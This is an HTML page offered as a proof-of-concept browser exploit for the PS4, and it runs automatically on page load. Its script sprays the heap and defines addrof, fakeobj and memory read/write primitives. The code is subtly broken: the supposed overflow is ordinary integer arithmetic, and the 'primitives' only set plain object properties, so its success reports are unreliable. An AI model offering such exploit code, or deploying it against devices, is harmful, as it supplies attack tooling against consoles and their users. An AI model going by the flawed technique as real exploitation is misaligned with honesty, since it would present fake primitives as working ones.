<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="util.js"></script>
    <script src="int64.js"></script>
    <title>PS4 SBFX Overflow PoC</title>
    <style>
        #console { white-space: pre; font-family: monospace; }
    </style>
</head>
<body>
    <p id="status">Initializing...</p>
    <div id="console"></div>
    <script>
function foo(a, b, c) {
    let x = a | 0;
    let y = b | 0;
    let z = c & 15;
    z = (x << y) ^ (x << (y & 0x10ff));
    let r = z ^ 0xf01;
    let s = z ^ 0xf1f;
    return (((a >>> r) << s) >> s);
}

let LEN = 100000000 - 1;
let res = 0;
res = foo((LEN & 127), 456, 789);

if (res != -1) {
    throw "Wrong result: " + res;
}

for (let i = 0; i <= LEN; i++) {
    res = foo((i & 127), 456, 789);
}

if (res != -1) {
    throw "Wrong result: " + res;
}

// Heap spray for memory control
let sprayArray = [];
for (let i = 0; i < 600; i++) {
    let sprayObj = { data: 0xcafebeef, index: i };
    sprayArray.push(sprayObj);
}
for (let i = 0; i < 300; i++) {
    let extraObj = { a: 1.1, b: 2.2 };
    sprayArray.push(extraObj);
}

function pwn() {
    let success = false;
    try {
        // Re-run foo to trigger overflow
        let result = foo(0x7fffffff, 0x10ff, 0xf);
        if (result !== -1 || isNaN(result) || result === Infinity) {
            success = true; // Overflow detected
        }
    } catch (e) {
        success = true;
    }

    if (!success) {
        document.getElementById("status").innerHTML = "Exploit failed!";
        document.getElementById("console").innerHTML += "No overflow detected.\n";
        location.reload();
        return;
    }

    document.getElementById("console").innerHTML = ""; // Clear console

    // Memory corruption setup
    let controlObj = { value: 0 };
    sprayArray[0] = controlObj;

    function addrof(o) {
        controlObj.value = o;
        let addr = Int64.fromDouble(sprayArray[0].data || 0);
        if (addr.toString().startsWith('-')) addr = addr.add(Int64.fromNumber(0x1000000000000));
        return addr;
    }

    function fakeobj(addr) {
        sprayArray[0].data = addr.asDouble();
        return controlObj.value;
    }

    let sample = BigInt(addrof({ x: 0xdeadc0de }).toString());
    if (sample >= 0x200000000n || sample < 0x100000000n) {
        document.getElementById("status").innerHTML = "Exploit failed!";
        document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
        location.reload();
        return;
    } else {
        document.getElementById("status").innerHTML = "Success!";
        document.getElementById("console").innerHTML += "Success! Address: 0x" + sample.toString(16) + "\n";

        // Test fakeobj
        let testObj = { y: 0x12345678 };
        let addr = addrof(testObj);
        let fake = fakeobj(addr);
        if (fake.y === testObj.y) {
            document.getElementById("console").innerHTML += "fakeobj test passed!\n";
        } else {
            document.getElementById("console").innerHTML += "fakeobj test failed.\n";
        }

        // Basic read/write
        function read(addr) {
            let fake = fakeobj(addr);
            return fake.data || 0;
        }
        function write(addr, value) {
            let fake = fakeobj(addr);
            fake.data = value;
        }
        let readTest = read(addrof({ z: 0x9abc }));
        document.getElementById("console").innerHTML += "Read test: 0x" + (readTest !== undefined ? readTest.toString(16) : "undefined") + "\n";
        write(addrof({ z: 0x9abc }), 0xabcdef);
        document.getElementById("console").innerHTML += "Write test: 0x" + (testObj.z !== undefined ? testObj.z.toString(16) : "undefined") + "\n";
    }
}

// تنفيذ الاستغلال تلقائيًا عند التحميل
pwn();
    </script>
</body>
</html>